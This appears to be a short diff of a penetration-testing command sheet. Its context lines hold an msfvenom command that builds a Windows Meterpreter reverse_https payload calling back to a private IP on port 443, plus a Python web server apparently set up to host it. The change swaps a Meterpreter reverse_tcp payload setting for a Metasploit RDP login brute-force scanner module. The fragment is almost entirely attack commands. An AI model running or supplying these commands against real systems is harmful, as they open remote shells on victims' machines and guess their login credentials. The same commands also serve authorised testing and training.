@@ -6,5 +6,4 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-set PAYLOAD windows/meterpreter/reverse_tcp
-
+use auxiliary/scanner/rdp/rdp_login
